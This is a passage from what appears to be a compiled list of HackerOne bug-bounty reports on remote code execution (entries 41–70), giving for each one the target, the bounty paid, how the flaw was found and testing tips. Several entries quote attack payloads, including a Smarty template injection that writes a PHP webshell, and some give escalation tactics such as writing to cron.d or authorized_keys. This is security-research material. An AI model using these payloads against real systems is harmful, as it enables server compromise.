- **Impact**: Full RCE on Uber's production servers through template injection.
- **Key Takeaway**: SSTI is one of the most reliable paths to RCE. Test every input with {{7*7}}, ${7*7}, #{7*7}, and engine-specific payloads. Jinja2, Twig, Freemarker, Velocity, and Mako all have known RCE gadgets.
- **Source**: https://hackerone.com/reports/125980

### 41. Apache Flink RCE via GET jar/plan API ($6,000)
- **Severity**: Critical
- **Bounty**: $6,000
- **Program**: Aiven Ltd
- **Platform**: HackerOne
- **Description**: RCE via Apache Flink's GET jar/plan API endpoint, earning $6,000 with 125 upvotes. The Flink dashboard's API allowed uploading and executing arbitrary JAR files.
- **How Found**: Testing Apache Flink management interfaces for code execution through job submission and JAR upload features.
- **Impact**: Code execution on Apache Flink cluster nodes, potential access to data processing pipelines and connected data stores.
- **Key Takeaway**: Data processing frameworks (Flink, Spark, Airflow, Kafka) that allow job submission are natural RCE targets. Test management APIs for unauthenticated access and code execution through job/task submission.
- **Source**: https://hackerone.com/reports/1418891

### 42. Smarty SSTI to RCE on Unikrn
- **Severity**: Critical
- **Bounty**: $0 (recognition)
- **Program**: Unikrn
- **Platform**: HackerOne
- **Description**: Server-side template injection via Smarty template engine leading to RCE on Unikrn, receiving 122 upvotes. The PHP Smarty template engine was processing user input, allowing template expression evaluation and code execution.
- **How Found**: Testing input fields with Smarty-specific template payloads like {php}system('id');{/php} and {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}.
- **Impact**: Full RCE on Unikrn's servers through Smarty template injection.
- **Key Takeaway**: PHP applications using Smarty, Twig, or Blade template engines should be tested for SSTI. Smarty has particularly dangerous built-in functions that allow direct code execution.
- **Source**: https://hackerone.com/reports/164224

### 43. Path Traversal to RCE on GitLab ($12,000)
- **Severity**: Critical
- **Bounty**: $12,000
- **Program**: GitLab
- **Platform**: HackerOne
- **Description**: Path traversal vulnerability escalated to RCE on GitLab, earning $12,000 with 140 upvotes. A file path manipulation vulnerability allowed writing to arbitrary locations, which was then leveraged for code execution.
- **How Found**: Testing file handling features for path traversal (../), then escalating by writing to web-accessible directories or configuration files to achieve code execution.
- **Impact**: Full server compromise of GitLab instances through path traversal to code execution.
- **Key Takeaway**: Path traversal vulnerabilities should always be tested for RCE escalation. Write to cron.d, authorized_keys, web roots, or application configuration files that trigger code execution.
- **Source**: https://hackerone.com/reports/733072

### 44. RCE via Dependency Confusion in Mail.ru (YouDrive)
- **Severity**: Critical
- **Bounty**: $0 (recognition)
- **Program**: Mail.ru
- **Platform**: HackerOne
- **Description**: RCE through dependency confusion in CI/CD pipeline on Mail.ru's YouDrive service (app-01.youdrive.club), receiving 84 upvotes. The CI/CD pipeline pulled packages from public registries where internal package names could be hijacked.
- **How Found**: Identifying internal package names in build configurations and publishing malicious packages with matching names on public registries.
- **Impact**: Code execution in the CI/CD pipeline, potential access to deployment secrets and production infrastructure.
- **Key Takeaway**: Dependency confusion works across all package ecosystems. Look for internal package references in public repositories, source maps, error messages, and build logs.
- **Source**: https://hackerone.com/reports/1104693

### 45. Mozilla VPN Clients RCE via File Write and Path Traversal ($6,000)
- **Severity**: Critical
- **Bounty**: $6,000
- **Program**: Mozilla
- **Platform**: HackerOne
- **Description**: RCE in Mozilla VPN clients via file write and path traversal, earning $6,000 with 164 upvotes. The VPN client had a vulnerability that allowed writing arbitrary files through path traversal, which could be leveraged for code execution.
- **How Found**: Analyzing the VPN client's file handling and update mechanisms for path traversal vulnerabilities in downloaded/cached files.
- **Impact**: Code execution on any machine running the Mozilla VPN client.
- **Key Takeaway**: VPN and security software clients run with elevated privileges, making RCE in these clients particularly impactful. Test update mechanisms, configuration file handling, and log file operations for path traversal.
- **Source**: https://hackerone.com/reports/2995025

### 46. Path Traversal + SSTI + RCE on Mail.ru Acquisition
- **Severity**: Critical
- **Bounty**: $2,000
- **Program**: Mail.ru
- **Platform**: HackerOne
- **Description**: A chain of path traversal, server-side template injection, and RCE on a Mail.ru acquisition, receiving 152 upvotes and earning $2,000. Multiple vulnerabilities were chained to achieve full code execution.
- **How Found**: Discovering an acquired company's infrastructure in Mail.ru's scope, finding path traversal that led to SSTI discovery, then escalating to RCE through template engine code execution.
- **Impact**: Full server compromise through a multi-vulnerability chain on an acquired company's infrastructure.
- **Key Takeaway**: Acquired companies often retain their original infrastructure with varying security levels. Chain vulnerabilities: path traversal can expose template files, SSTI can lead to RCE.
- **Source**: https://hackerone.com/reports/536130

### 47. MobileIron Unauthenticated RCE on QIWI with WAF Bypass
- **Severity**: Critical
- **Bounty**: $0 (recognition)
- **Program**: QIWI
- **Platform**: HackerOne
- **Description**: Unauthenticated RCE on QIWI's mobile device management server (mdm.qiwi.com) running MobileIron, with a WAF bypass technique, receiving 148 upvotes.
- **How Found**: Identifying MDM infrastructure through subdomain enumeration, detecting MobileIron software, then exploiting known CVEs with WAF bypass techniques.
- **Impact**: Full compromise of QIWI's mobile device management server, potential access to all managed mobile devices.
- **Key Takeaway**: MDM (Mobile Device Management) servers are extremely high-value targets. They control fleets of corporate mobile devices and often run software with known CVEs.
- **Source**: https://hackerone.com/reports/983548

### 48. Unauthenticated SSRF to RCE (Jira to Confluence) on QIWI
- **Severity**: Critical
- **Bounty**: $0 (recognition)
- **Program**: QIWI
- **Platform**: HackerOne
- **Description**: An unauthenticated SSRF in Jira (jira.tochka.com) was chained with an RCE vulnerability in Confluence (confluence.bank24.int) to achieve code execution on internal infrastructure, receiving 221 upvotes.
- **How Found**: Finding an SSRF in the external-facing Jira instance, then using it to reach an internal Confluence server and exploiting a known RCE vulnerability.
- **Impact**: Code execution on internal Confluence server through SSRF chain from external Jira.
- **Key Takeaway**: SSRF is often a gateway to internal RCE. Use SSRF to reach internal services (Jenkins, Confluence, Elasticsearch, Redis) that may have unpatched RCE vulnerabilities because they are "internal only."
- **Source**: https://hackerone.com/reports/713900

### 49. OOB Reads in Network Message Handlers Leading to RCE (Valve)
- **Severity**: Critical
- **Bounty**: $7,500
- **Program**: Valve
- **Platform**: HackerOne
- **Description**: Out-of-bounds reads in network message handlers leading to RCE in Valve game clients, earning $7,500 with 212 upvotes. The game network protocol parser had memory corruption bugs exploitable for code execution.
- **How Found**: Fuzzing game network protocol message handlers and analyzing memory access patterns for out-of-bounds conditions.
- **Impact**: Remote code execution on game clients through malicious network messages from game servers or other players.
- **Key Takeaway**: Game networking protocols are complex and often contain memory corruption bugs. Fuzzing binary protocols with tools like AFL, libFuzzer, or custom protocol fuzzers is highly effective.
- **Source**: https://hackerone.com/reports/807772

### 50. RCE on CS:GO Client via Unsanitized Entity ID ($9,000)
- **Severity**: Critical
- **Bounty**: $9,000
- **Program**: Valve
- **Platform**: HackerOne
- **Description**: RCE on CS:GO client using an unsanitized entity ID in EntityMsg messages, earning $9,000 with 207 upvotes. The game client did not validate entity IDs, allowing out-of-bounds memory access and code execution.
- **How Found**: Reverse engineering the CS:GO client's entity message processing, identifying that entity IDs were not bounds-checked before being used as array indices.
- **Impact**: Remote code execution on any CS:GO player's machine through malicious game server messages.
- **Key Takeaway**: Integer-based identifiers (entity IDs, object IDs, indices) that are used directly as array indices without bounds checking are a classic source of memory corruption bugs.
- **Source**: https://hackerone.com/reports/584603

### 51. RCE via Portal 2 Voice Packets ($5,000)
- **Severity**: Critical
- **Bounty**: $5,000
- **Program**: Valve
- **Platform**: HackerOne
- **Description**: Remote code execution via voice packets in Portal 2, earning $5,000 with 172 upvotes. The voice codec processing in the game client had a vulnerability exploitable through crafted voice data packets.
- **How Found**: Analyzing the voice chat protocol and codec implementation for memory corruption vulnerabilities through fuzzing.
- **Impact**: Code execution on any Portal 2 player's machine through malicious voice data.
- **Key Takeaway**: Audio and video codec implementations are rich targets for memory corruption bugs. Voice chat, video conferencing, and media playback code should be fuzzed extensively.
- **Source**: https://hackerone.com/reports/733267

### 52. Git Flag Injection to File Overwrite and RCE on GitLab ($3,500)
- **Severity**: Critical
- **Bounty**: $3,500
- **Program**: GitLab
- **Platform**: HackerOne
- **Description**: A second git flag injection vulnerability on GitLab leading to file overwrite and potential RCE, earning $3,500 with 169 upvotes. This was a variant of the earlier git flag injection finding.
- **How Found**: Continuing to analyze git command construction in GitLab after the first flag injection finding, identifying additional injection points.
- **Impact**: File overwrite leading to code execution on GitLab servers.
- **Key Takeaway**: After finding one injection point in a codebase, search for similar patterns throughout the application. The same class of vulnerability often exists in multiple places.
- **Source**: https://hackerone.com/reports/653125

### 53. RCE of Burp Scanner/Crawler via Clickjacking ($3,000)
- **Severity**: Critical
- **Bounty**: $3,000
- **Program**: PortSwigger Web Security
- **Platform**: HackerOne
- **Description**: RCE on Burp Suite's scanner/crawler through clickjacking, earning $3,000 with 169 upvotes. The security tool itself was vulnerable to RCE when scanning malicious websites that used clickjacking to interact with Burp's interface.
- **How Found**: Testing how security tools handle malicious content during scanning, identifying that Burp's embedded browser could be manipulated through clickjacking.
- **Impact**: Code execution on the security researcher's machine when scanning a malicious target.
- **Key Takeaway**: Security tools (Burp Suite, ZAP, browsers) that process untrusted content are themselves targets. Malicious websites can attack the tools scanning them, creating "scanner exploitation" scenarios.
- **Source**: https://hackerone.com/reports/1274695

### 54. WordPress RCE as Admin (Hardening Bypass)
- **Severity**: Critical
- **Bounty**: $0 (recognition)
- **Program**: WordPress
- **Platform**: HackerOne
- **Description**: RCE that bypasses WordPress hardening and file permissions as an admin user, receiving 163 upvotes. Even with security hardening applied, an admin user could achieve code execution through specific WordPress features.
- **How Found**: Analyzing WordPress admin features for code execution paths that survive security hardening (disable_file_edit, DISALLOW_FILE_MODS).
- **Impact**: Code execution on any WordPress site where an attacker has admin access, even with security hardening enabled.
- **Key Takeaway**: CMS admin panels often have code execution paths (plugin upload, theme editing, import features). Even "hardened" installations may have bypasses. Test all admin features for code execution.
- **Source**: https://hackerone.com/reports/436928

### 55. Pre-Auth RCE on Uber SSL VPN Servers ($2,000)
- **Severity**: Critical
- **Bounty**: $2,000
- **Program**: Uber
- **Platform**: HackerOne
- **Description**: Pre-authentication remote code execution on multiple Uber SSL VPN servers, earning $2,000 with 80 upvotes. The VPN infrastructure was running vulnerable software (likely Pulse Secure or similar) that allowed unauthenticated RCE.
- **How Found**: Scanning Uber's infrastructure for VPN endpoints, then testing for known pre-auth RCE CVEs in VPN appliance software.
- **Impact**: Compromise of multiple Uber VPN servers, potential access to internal corporate network.
- **Key Takeaway**: VPN appliance CVEs (Pulse Secure CVE-2019-11510, Fortinet CVE-2018-13379, Citrix CVE-2019-19781) are among the most impactful findings. Monitor VPN CVE disclosures and test quickly.
- **Source**: https://hackerone.com/reports/540242

### 56. Grafana RCE via SMTP Server Parameter Injection ($5,000)
- **Severity**: Critical
- **Bounty**: $5,000
- **Program**: Aiven Ltd
- **Platform**: HackerOne
- **Description**: RCE in Grafana through SMTP server parameter injection, earning $5,000 with 72 upvotes. The Grafana monitoring tool's email notification configuration allowed injection of commands through the SMTP server parameter.
- **How Found**: Testing Grafana's notification configuration for command injection in SMTP server, port, and authentication parameters.
- **Impact**: Code execution on Grafana monitoring servers, potential access to monitored infrastructure data and dashboards.
- **Key Takeaway**: Monitoring and alerting tools (Grafana, Nagios, Zabbix) that send notifications via SMTP, SMS, or webhooks often have injection points in their notification configuration.
- **Source**: https://hackerone.com/reports/1200647

### 57. Remote Code Execution via Extract App Plugin (Nextcloud)
- **Severity**: Critical
- **Bounty**: $0 (recognition)
- **Program**: Nextcloud
- **Platform**: HackerOne
- **Description**: RCE through Nextcloud's Extract app plugin, receiving 124 upvotes. The archive extraction plugin allowed code execution through crafted archive files (zip slip or similar).
- **How Found**: Testing the archive extraction functionality with malicious archive files containing path traversal entries or symlinks.
- **Impact**: Code execution on Nextcloud servers through the file extraction feature.
- **Key Takeaway**: Archive extraction features are classic RCE vectors (zip slip attacks). Test with archives containing path traversal entries (../../webshell.php), symlinks to sensitive files, and extremely large files (zip bombs).
- **Source**: https://hackerone.com/reports/546753

### 58. Kafka Connect RCE via SASL JAAS JndiLoginModule ($5,000)
- **Severity**: Critical
- **Bounty**: $5,000
- **Program**: Aiven Ltd
- **Platform**: HackerOne
- **Description**: RCE in Kafka Connect via SASL JAAS JndiLoginModule configuration combined with SSRF through JdbcSinkConnector and HttpSinkConnector, earning $5,000 with 56 upvotes.
- **How Found**: Analyzing Kafka Connect's connector configuration for JNDI injection points in SASL authentication parameters, similar to Log4Shell-style attacks.
- **Impact**: Code execution on Kafka Connect workers, potential access to all data flowing through the Kafka cluster.
- **Key Takeaway**: JNDI injection extends beyond Log4j. Any Java application that processes JNDI lookups in configuration (LDAP URLs, RMI references) is potentially vulnerable to RCE.
- **Source**: https://hackerone.com/reports/1529790

### 59. CVE-2025-24813: Apache Tomcat RCE via Default Servlet ($4,323)
- **Severity**: Critical
- **Bounty**: $4,323
- **Program**: Internet Bug Bounty
- **Platform**: HackerOne
- **Description**: Remote code execution and information disclosure via write-enabled default servlet in Apache Tomcat, earning $4,323 with 55 upvotes. The vulnerability allowed malicious content injection and potential code execution through partial PUT requests.
- **How Found**: Analyzing Apache Tomcat's default servlet implementation for vulnerabilities when write access is enabled, identifying that partial PUT could be used for malicious file upload.
- **Impact**: Code execution on Apache Tomcat servers with the default servlet's write functionality enabled.
- **Key Takeaway**: Web server default configurations and built-in servlets are often overlooked. Test default/built-in endpoints of web servers (Tomcat, Nginx, Apache) for unintended functionality.
- **Source**: https://hackerone.com/reports/3031518

### 60. RCE via Remote Code Execution in Kibana ($5,000)
- **Severity**: Critical
- **Bounty**: $5,000
- **Program**: Elastic
- **Platform**: HackerOne
- **Description**: Remote code execution in Kibana 7.7.0, earning $5,000 with 14 upvotes. The Elasticsearch visualization platform had a vulnerability allowing code execution through crafted requests.
- **How Found**: Testing Kibana's dashboard rendering and visualization features for code execution, particularly in scripted fields and Timelion expressions.
- **Impact**: Code execution on Kibana/Elasticsearch servers, potential access to all indexed data across the cluster.
- **Key Takeaway**: Data visualization and analytics platforms (Kibana, Grafana, Metabase) that allow custom queries or scripted expressions are potential RCE targets. Test scripted fields, custom expressions, and query languages.
- **Source**: https://hackerone.com/reports/861744

### 61. RCE Hazard in Elastic Reporting via Chromium ($10,000)
- **Severity**: Critical
- **Bounty**: $10,000
- **Program**: Elastic
- **Platform**: HackerOne
- **Description**: RCE hazard in Elastic's reporting feature which uses Chromium for PDF generation, earning $10,000 with 25 upvotes. The headless Chromium instance used for report generation could be exploited for code execution.
- **How Found**: Analyzing how Elastic's reporting feature renders content using headless Chromium, identifying that crafted dashboard content could exploit the browser for code execution.
- **Impact**: Code execution through Elastic's reporting infrastructure.
- **Key Takeaway**: Headless browser instances (Chromium, Puppeteer, Playwright) used for PDF generation, screenshots, or rendering are RCE targets. Test by injecting content that exploits the headless browser.
- **Source**: https://hackerone.com/reports/1168765

### 62. Mozilla RCE via CI Build Cache Poisoning ($8,000)
- **Severity**: Critical
- **Bounty**: $8,000
- **Program**: Mozilla
- **Platform**: HackerOne
- **Description**: Remote code execution and secret token exfiltration by poisoning Mozilla's FxA CI build cache, earning $8,000 with 57 upvotes. By manipulating the CI build cache, the researcher achieved code execution in the build pipeline and accessed deployment secrets.
- **How Found**: Analyzing Mozilla's CI/CD pipeline configuration, identifying that the build cache could be poisoned with malicious content that would be executed during subsequent builds.
- **Impact**: Code execution in Mozilla's CI/CD pipeline, exfiltration of secret tokens and deployment credentials.
- **Key Takeaway**: CI/CD cache poisoning is an emerging attack vector. Analyze how build caches are shared between branches, and whether a PR or fork can inject malicious cached artifacts that affect production builds.
- **Source**: https://hackerone.com/reports/2255750

### 63. Kafka Connect RCE via SASL JAAS Configuration ($5,000)
- **Severity**: Critical
- **Bounty**: $5,000
- **Program**: Aiven Ltd
- **Platform**: HackerOne
- **Description**: A second Kafka Connect RCE finding via SASL JAAS configuration injection, earning $5,000 with 43 upvotes. The Kafka Connect framework allowed injection of JNDI references through connector SASL configuration parameters.
- **How Found**: Testing Kafka Connect's authentication configuration for JNDI injection in JAAS login module parameters.
- **Impact**: Code execution on Kafka Connect workers through authentication configuration injection.
- **Key Takeaway**: Java authentication frameworks (JAAS, SASL) that support JNDI lookups are potential RCE vectors. Test LDAP URLs, RMI references, and DNS lookups in authentication configuration parameters.
- **Source**: https://hackerone.com/reports/1529790

### 64. Nextcloud Desktop Client RCE via Malicious URI Schemes ($1,000)
- **Severity**: Critical
- **Bounty**: $1,000
- **Program**: Nextcloud
- **Platform**: HackerOne
- **Description**: RCE in Nextcloud Desktop Client through malicious URI schemes, earning $1,000 with 73 upvotes. The desktop client handled custom URI schemes in a way that allowed injection of commands through crafted links.
- **How Found**: Testing custom protocol handler registration and URI parsing in the Nextcloud desktop application for command injection.
- **Impact**: Code execution on any machine running the Nextcloud desktop client when a user clicks a malicious link.
- **Key Takeaway**: Desktop applications that register custom URI schemes (nextcloud://, myapp://) are prime targets. Test for command injection in URI parameters, path traversal in file URIs, and argument injection in protocol handlers.
- **Source**: https://hackerone.com/reports/1078002

### 65. Management Console RCE Leading to Root SSH on GitHub Enterprise ($0)
- **Severity**: Critical
- **Bounty**: $0 (recognition)
- **Program**: GitHub
- **Platform**: HackerOne
- **Description**: Management console editor privilege escalation to root SSH access in GitHub Enterprise Server via RCE in multiple system components (ghe-update-check, syslog-ng, actions-console, collectd), receiving 86+ upvotes across multiple reports.
- **How Found**: Analyzing GitHub Enterprise Server's management console for privilege escalation paths from editor role to root access through command injection in system management utilities.
- **Impact**: Full root access on GitHub Enterprise Server instances, potential access to all hosted repositories and enterprise data.
- **Key Takeaway**: On-premise enterprise software management consoles often have privilege escalation paths. Test every management function for command injection, especially system update, log management, and monitoring features.
- **Source**: https://hackerone.com/reports/2325023

### 66. CVE-2022-40127: RCE in Apache Airflow Bash Example ($4,000)
- **Severity**: Critical
- **Bounty**: $4,000
- **Program**: Internet Bug Bounty
- **Platform**: HackerOne
- **Description**: RCE in Apache Airflow versions before 2.4.0 through a bash example DAG, earning $4,000 with 60 upvotes. The example DAG did not sanitize parameters before passing them to bash execution.
- **How Found**: Code review of Apache Airflow's example DAGs, identifying that user-supplied parameters were passed directly to shell commands.
- **Impact**: Remote code execution on any Airflow installation using the vulnerable example DAGs.
- **Key Takeaway**: Example code and default configurations in widely-used software are high-impact targets. Many organizations deploy examples/demos without modification, creating vulnerable installations.
- **Source**: https://hackerone.com/reports/1776476

### 67. RCE on facebooksearch.algolia.com ($500)
- **Severity**: Critical
- **Bounty**: $500
- **Program**: Algolia
- **Platform**: HackerOne
- **Description**: Remote code execution on facebooksearch.algolia.com, earning $500 with 74 upvotes. The Facebook search integration on Algolia's infrastructure had a vulnerability allowing code execution.
- **How Found**: Discovering third-party integrations with major platforms (Facebook, Google) that may have weaker security than the main platform.
- **Impact**: Code execution on Algolia's infrastructure hosting Facebook search integration.
- **Key Takeaway**: Third-party integrations and partner services of major platforms are often less secured than the main platform. Look for partner integrations, API proxies, and branded subdomains on third-party infrastructure.
- **Source**: https://hackerone.com/reports/134321

### 68. Remote Code Execution via Insecure Deserialization in Telerik UI
- **Severity**: Critical
- **Bounty**: $0 (VDP)
- **Program**: U.S. Dept of Defense
- **Platform**: HackerOne
- **Description**: RCE through insecure deserialization in Telerik UI (CVE-2019-18935) on multiple DoD websites. The .NET Telerik UI framework had a deserialization vulnerability that allowed arbitrary code execution.
- **How Found**: Scanning DoD websites for Telerik UI fingerprints, then exploiting the known deserialization CVE (CVE-2019-18935) with crafted serialized payloads.
- **Impact**: Code execution on DoD web servers running Telerik UI.
- **Key Takeaway**: .NET deserialization vulnerabilities in Telerik UI, ViewState, and BinaryFormatter are common on government and enterprise sites. Scan for Telerik UI and test with CVE-2019-18935 exploits.
- **Source**: https://hackerone.com/reports/838196

### 69. Struct Type Confusion RCE on Shopify Scripts ($18,000)
- **Severity**: Critical
- **Bounty**: $18,000
- **Program**: Shopify (shopify-scripts)
- **Platform**: HackerOne
- **Description**: Struct type confusion vulnerability in Shopify's mruby-based script engine leading to RCE, earning $18,000 with 12 upvotes. The type confusion allowed breaking out of the mruby sandbox to achieve native code execution.
- **How Found**: Fuzzing and analyzing the mruby virtual machine used for Shopify Scripts, finding type confusion bugs that could be exploited for sandbox escape.
- **Impact**: Sandbox escape and code execution on Shopify's infrastructure through the script engine used for store customization.
- **Key Takeaway**: Sandbox escape in scripting engines (mruby, Lua, V8) is a high-value target for companies that allow user-provided code. Look for type confusion, use-after-free, and bounds check bypass in VM implementations.
- **Source**: https://hackerone.com/reports/181879

### 70. RCE via Unsafe YAML Load on Liberapay
- **Severity**: Critical
- **Bounty**: $0 (recognition)
- **Program**: Liberapay
- **Platform**: HackerOne
- **Description**: Unsafe YAML deserialization leading to remote code execution on Liberapay, a donation platform, receiving 55 upvotes. The application used yaml.load() instead of yaml.safe_load() on user-controlled YAML input.
- **How Found**: Identifying YAML parsing in the application and testing with YAML deserialization payloads that instantiate arbitrary Python objects.
- **Impact**: Code execution on Liberapay's servers through YAML deserialization.
- **Key Takeaway**: YAML deserialization is dangerous in Python (yaml.load), Ruby (YAML.load), and Java (SnakeYAML). Always look for YAML parsing of user input and test with deserialization gadget payloads.
- **Source**: https://hackerone.com/reports/2467232
